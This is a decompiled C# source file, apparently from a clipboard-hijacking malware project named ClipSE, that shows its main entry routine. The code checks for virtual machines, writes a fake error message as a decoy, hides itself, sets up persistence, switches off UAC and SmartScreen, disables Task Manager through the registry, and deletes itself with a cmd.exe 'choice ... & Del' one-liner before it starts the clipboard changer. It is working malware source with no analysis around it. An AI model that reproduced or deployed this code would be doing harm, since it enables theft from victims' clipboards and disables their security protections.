using System;
using System.IO;
using System.Threading;

namespace ClipSE
{
	// Token: 0x02000002 RID: 2
	internal static class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002064 File Offset: 0x00000264
		[STAThread]
		public static void Main()
		{
			if (RunCheck.CheckMutex())
			{
				Date date = new Date();
				if (date.AntiVm && CheckVirtual.CheckWMI())
				{
					Environment.Exit(0);
				}
				if (date.Delay)
				{
					Program.Sleeping(RunCheck.ThreadSleep);
				}
				if (GlobalPath.AssemblyPath.StartsWith(GlobalPath.StartUpFromAppDataReserv, StringComparison.OrdinalIgnoreCase))
				{
					if (!GlobalFile.IsHideOrNo())
					{
						GlobalFile.HideFile(GlobalPath.AssemblyPath, FileAttributes.Hidden);
					}
					ClipChanger.StartChanger();
					return;
				}
				new Thread(delegate()
				{
					ProcessControl.KillClipInizialize();
				})
				{
					IsBackground = true
				}.Start();
				if (date.AddGarbage)
				{
					new Thread(delegate()
					{
						Garbage.InizializeTrash(500);
					}).Start();
				}
				if (date.FakeText)
				{
					File.WriteAllText(string.Concat(new string[]
					{
						"Error.txt"
					}), GlobalPath.MessageErrorTextForUser);
				}
				if (date.AddInSystemRun)
				{
					InjReg.CopyAndShelduderInizialize();
					RegistryControl.ToogleHidingFolders("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", 2);
					ExpSetting.RefreshExplorer();
					if (date.Uac)
					{
						RegistryControl.ToogleUacAdmin("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0);
					}
					if (date.Smart)
					{
						RegistryControl.ToogleSmartScreen("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", "SmartScreenEnabled", "Off");
					}
					if (date.TaskLock)
					{
						RegistryControl.ToogleTaskMandRegedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies", 1);
					}
					GlobalFile.HideFile(GlobalPath.AssemblyPath, FileAttributes.Normal);
					Liquidation.Inizialize(GlobalPath.BatchFile);
					Liquidation.SelfDelete("cmd.exe", "/C choice /C Y /N /D Y /T 1 & Del \"" + GlobalPath.GetFileName);
					return;
				}
				if (!GlobalFile.IsHideOrNo())
				{
					GlobalFile.HideFile(GlobalPath.AssemblyPath, FileAttributes.Hidden);
					ClipChanger.StartChanger();
					return;
				}
			}
			else
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002218 File Offset: 0x00000418
		public static void Sleeping(int time)
		{
			try
			{
				Thread.Sleep(time);
			}
			catch
			{
			}
		}
	}
}
